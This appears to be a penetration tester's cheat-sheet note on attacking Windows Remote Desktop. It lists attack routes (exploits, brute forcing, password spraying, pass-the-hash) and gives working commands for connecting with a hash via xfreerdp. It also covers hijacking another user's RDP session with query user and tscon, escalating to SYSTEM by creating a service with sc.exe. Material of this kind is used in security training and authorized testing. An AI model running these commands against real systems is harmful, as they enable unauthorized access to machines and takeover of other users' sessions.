-- -
### Attacks
- See if RDP version is vulnerable to an exploit
- Try [[Medusa| Brute forcing a users password]]
- Try a [[Dark Arts/Passwords/Password Spray/Linux|Password Spray Attack]]
- Try a [[PtH]] attack
### Connecting w/ valid credentials
```bash
# xfree rdp
xfreerdp /v:<ip> /u:<username> /p:<passwd> 

# rdesktop
rdesktop -u <username> -p <passwd> <ip>
```
### Connecting via PtH
```bash
xfreerdp /v:<ip> /u:<username> /pth:<hash>
```

^062e8b

### Session Hijacking
You need to have `SYSTEM` privs to pull this off, so more likely than not, you need:
1. to be local admin
2. have logged into the account via rdp
3. there needs to be another logged in user

To see if another user is logged in via rdp, pull up `PowerShell` or `CMD`.
```powershell
# you will need the following:
# SESSIONNAME (ours)
# ID (targets)
query user
```

To hijack the session, if the account has `SYSTEM` privs set already, you can just run:
```powershell
# this will open a terminal that's logged in as the other user
tscon <target session ID> /dest:<our session name>
tscon 2 /dest:rdp-tcp#13
```

There are a multitude of ways to get `SYSTEM` privs, one such way if you are a local admin is to setup a service that runs the above command when executed. The service will automatically run with `SYSTEM` privs and open a terminal up as the other user. 
```powershell
# setup session hijack service
sc.exe create <service name> binpath= "cmd.exe /k tscon <targetsession id> /dest:<our session name>"
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

# start the service
net start <session name>
net start sessionhijack
```